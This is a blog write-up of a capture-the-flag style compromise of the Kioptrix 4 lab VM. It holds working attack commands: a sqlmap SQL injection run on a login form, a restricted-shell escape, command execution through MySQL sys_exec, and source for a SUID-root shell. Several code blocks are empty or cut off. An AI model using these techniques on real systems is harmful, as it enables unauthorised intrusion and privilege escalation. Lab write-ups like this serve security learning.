I know there are a few different methods to the new [Kioptrix 4](http://www.kioptrix.com/blog/?p=604) boot2root.  Unfortunately, I could not find the remote root exploit that is mentioned, but my method used several tools, and privilege escalation. 

<!-- more -->

Tools used: 

* [Backtrack 5 VM](http://www.backtrack-linux.org)
* [Nmap](http://nmap.org)
* [SqlMap](http://sqlmap.org)

To start out, I had to find the machine on the network.  I booted up my Backtrack VM and Kioptrix VM both using a NAT connection in my VMWare.  This would put them on the same internal network.  In BackTrack, I first found my IP address: 

```
root@bt:~# ifconfig

```


Using this information, I scanned the subnet for other devices: 

```
root@bt:~# netdiscover -r 192.168.95.0/24

 192.168.95.254  00:50:56:fb:ac:b6    01    060   VMWare, Inc.  
```

I figured out of that list, that 1, 2, and 254 were reserved ones, and that 192.168.95.131 would be my Kioptrix VM.  So I did a port scan. 

```

```

I started to poke around.  Since HTTP is often times the easiest for me, I started there.  I went to http://<nolink>192.168.95.131 and was presented with a basic login screen (and a cute goat).  I attempted to use the username of "admin", with the same password, "admin".  It redirected me to a password failure page, located at http://<nolink>192.168.95.131/checklogin.php.  I used the Firefox extension, Tamper Data, to double-check the POST query-string.  It showed, "myusername=admin&mypassword=admin&Submit=Login". 

My instincts told me that I should attempt some sql injection on these login screens.  I tinkered with some of the basic ones I remembered off the top of my head, but none of them worked.  It did show promise though, as I received several errors in the process.  This meant it was time for the big guns.   

SqlMap is a tool that I'm not super familiar with, but will definitely be learning more about.  It's very powerful, even in the hand of a beginner.  I used the url that I posted to, and specified a few options, and just watched it go: 

```
root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data="myusername=admin&mypassword=admin&Submit=Login" --level=5 --risk=3 --dbs

During this run, you can see that it prompted me only 2 times.  Once because it was redirected, and asked if I wanted to stay on the same page or follow the redirect.  Another because it found that "mypassword" was injectable, and wanted to know if I wanted to try some others.  I didn't care about any other pages, or any other variables if the first one worked. 

This gave me 3 MySQL databases, "information_schema", "mysql", and "members".  The first two are default in MySQL installations, but the last probably has to do with the Kioptrix VM.  So I decided to go further with the "members" database.  I opted to dump all the data in the "members" database.

So there we have some credentials!  When I tried these on the login page, both of them worked!  However, it was a dead end, as it just showed me the usernames and passwords that I just entered. 

On a whim, I tried using the first login to ssh in, and it worked! 

```
root@bt:/pentest/database/sqlmap# ssh john@192.168.95.131
john@192.168.95.131's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ 
```

So I guess that was good news.  However the bad news was that it was in a form of a restricted shell.  I was not familiar with the "LigGoat Shell".  However, it seemed somewhat limiting.  It only allowed the commands of, "cd", "clear", "echo", "exit", "help", "ll", "lpath", and "ls".  Like most other restricted shells that I've ran into in the past, it would not let you pipe things, or access items outside your folder.  So if you did a "ls ../", it would not work.  However, unlike other shells, this one would actually disconnect you after a single warning of violating these rules!  Luckily, in my searching for methods to break out of a restricted shell, I found a great article on my buddy, g0tmi1k's site, [here](http://g0tmi1k.blogspot.com/2011/08/basic-linux-privilege-escalation.html). 

```
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ 
```

I now had an unrestricted bash shell.  I was still limited to the "john" user, which seemed to have normal user privileges.  The next step was to escalate to root privileges.  I started with looking at what was running. 

```

I couldn't help but notice that MySQL was running as "root".  This is typically a no-no, so I attempted to make it my target.  I attempted to login with the root user, and a blank password: 

```
john@Kioptrix4:~$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4999
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql>
```

I figured if it was running as root, I would try running some system commands. 

```
mysql> SELECT sys_exec('touch /tmp/thisisatest');
+------------------------------------+
| sys_exec('touch /tmp/thisisatest') |
+------------------------------------+
| NULL                               | 
+------------------------------------+
1 row in set (0.00 sec)
```

And then to verify that it ran successfully: 

```
john@Kioptrix4:~$ ls -al /tmp
total 12
drwxrwxrwt  3 root root 4096 2012-02-12 00:28 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
```

That was a very good sign!  I decided my method of exploitation would be to use a C program, set it to SUID root, and run it.  I used this C program that I have used many times before. 

```
int main()
{
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system( "/bin/bash" );
    return 0;
}
```

I then compiled it.  Note that gcc was not installed, and cpp gave me issues, so I compiled it on the BackTrack VM, and then SFTP'd the file over. 

```
root@bt:~# gcc -o exploit exploit.c
```

```
john@Kioptrix4:/tmp$ scp root@192.168.95.136:exploit exploit
root@192.168.95.136's password: 
exploit
```

I then used MySQL to set it to SUID and executable.  Before that, I'd have to chown it to root, so that the SUID would actually be useful. 

```
john@Kioptrix4:/tmp$ mysql -u root -h localhost

The /tmp folder now looked like this: 

```
john@Kioptrix4:/tmp$ ls -al
total 20
drwxrwxrwt  3 root root 4096 2012-02-12 00:31 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rwsrwsrwx  1 root root  166 2012-02-12 00:31 exploit
-rw-r--r--  1 john john  103 2012-02-12 00:31 exploit.c
-rw-rw----  1 root root    0 2012-02-12 00:26 thisisatest
drwxr-xr-x  2 root root 4096 2012-02-11 11:07 .winbindd
```

From there, it was just as simple as running the exploit. 

```
john@Kioptrix4:/tmp$ ./exploit 
root@Kioptrix4:/tmp# id
uid=0(root) gid=0(root) groups=1001(john)
root@Kioptrix4:/tmp# whoami
root
```

And there you have it, root access!
